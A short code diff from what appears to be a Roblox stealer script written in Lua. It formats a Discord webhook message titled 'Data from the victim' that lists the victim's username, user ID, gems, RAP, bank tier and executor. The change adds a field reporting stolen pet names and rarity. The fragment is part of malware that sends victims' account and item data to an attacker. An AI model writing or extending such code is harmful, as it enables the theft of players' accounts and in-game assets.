@@ -51,6 +51,13 @@ local msg = {
 		["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\n💎Gems: **".._G.DisplayDiamond.."**\n⬆️Rap: **".._G.DisplayRap.."**\n📈Bank Tier: **".._G.DisplayBankTier.."**\n☠Executor: **"..getexploit().."**",
 		["url"]= "https://discord.gg/34fs3FWt",
 		["color"]= ""..webhookcolor.."",
+		["fields"]= {
+        {
+          ["name"]= "Pet Name & Rarity",
+          ["value"]= "```Pet Name: "..v2.name.."\nPet Rarity: "..v2.rarity.."```",
+		  ["inline"]= true
+        },
+      }
   }
   },
 	["attachments"] = {}
